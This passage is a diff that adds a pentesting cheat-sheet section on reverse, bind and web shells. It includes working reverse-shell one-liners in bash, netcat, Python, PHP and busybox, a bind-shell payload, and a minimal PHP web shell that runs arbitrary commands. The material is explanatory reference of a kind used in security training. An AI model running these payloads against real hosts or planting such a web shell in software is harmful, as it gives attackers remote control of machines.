@@ -231,12 +231,93 @@ XXE injections are often used to expose the content of a file on the target mach
 They can also be used for SSRF (Server-Side Request Forgery) to force the target machine to send a specific request to another machine.
 
 
+## Shells
+
+### Reverse shell
+
+A reverse shell is a connection initiated by the target machine to the local machine.  
+This requires to have access to the target machine to force it to initiate this connection.  
+Reverse shells are more difficult to detect by firewalls, since they look like legitimate traffic.  
+
+We can use `netcat` to listen for an incoming connection on the local machine.  
+It can listen on any port, but the common ports (80, 443, 53, 139, 445) are often used to not raise suspicion.
+```commandline
+nc -lvnp 1234
+```
+Once we have a listening process locally, we can execute a payload to initiate the connection on the target machine.  
+The payload command to use will depend on the available languages and command versions on the target machine.
+
+Examples of reverse shell payload commands to connect to local machine `10.0.0.1` on port 1234 :
+```shell
+# Bash - using interactive bash linked to a TCP connection
+bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
+
+# Bash - creating a file descriptor and a while loop executing commands from the TCP connection
+exec 5<>/dev/tcp/10.0.0.1/1234; cat <&5 | while read line; do $line 2>&5 >&5; done 
+
+# Netcat - with the -e parameter to connect to the local machine and start a shell
+# the -e option is considered dangerous and often not allowed
+nc -e /bin/sh 10.0.0.1 1234
+
+# Netcat - without the -e option
+# It creates a pipe with "mkfifo", a netcat process that writes to it, and a bash process that reads from it
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.0.0.1 1234 >/tmp/f
+
+# Python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# PHP 
+php -r '$sock=fsockopen("10.0.0.1",1234);system("sh <&3 >&3 2>&3");' 
+
+# Busybox (bundle of tiny versions of many common UNIX utilities, including Netcat)
+busybox nc 10.0.0.1 1234 -e sh
+```
+
+### Bind Shell
+
+Unlike a reverse shell, a bind shell is obtained when the target machine is listening, and the local machine connects to it.  
+This is more likely to be detected, since the connection is initiated from outside the target machine's network.    
+This is convenient if the target machine does not allow outgoing connections.
+
+On the target machine, we also use a payload to expose a shell to clients connecting to it (port > 1024 to not need sudo permission).  
+It is similar to the reverse shell payload, but this time it waits for an incoming connection instead of connecting to the target machine.
+```shell
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+```
+
+The target machine then needs to connect to it to interact with the exposed bind shell :
+```shell
+nc -vn <TARGET_IP> 8080
+```
+
+
+### Web Shell
+
+A web shell is a script uploaded to a web server that allows to send commands that the web server executes.  
+A web shell is written in a language that the web server can execute, usually PHP, ASP, JSP or CGI.  
+It can be uploaded to the web server by exploiting an unrestricted file upload vulnerability for example.  
+Once uploaded to the web server, we just query its URL to have the web server execute arbitrary commands.  
+As part of penetration testing, we can try to upload this file to the web server to gain access to it.
+
+The below PHP script is a very simple web shell that takes a `cmd` parameter and executes it :
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+Some publicly available PHP web shells can be used, like the [p0wny-shell](https://github.com/flozz/p0wny-shell) or the [c99 shell](https://www.r57shell.net/single.php?id=13).  
+
+
 ## Run a local webserver
 
 Run a local web server on port 8000 delivering files in its execution folder : 
 ```commandline
 python -m http.server
 ```
+
+This can be used if we have a shell on a target machine to download a file (like a payload) from the local machine.
 
 
 ## Special IP addresses 
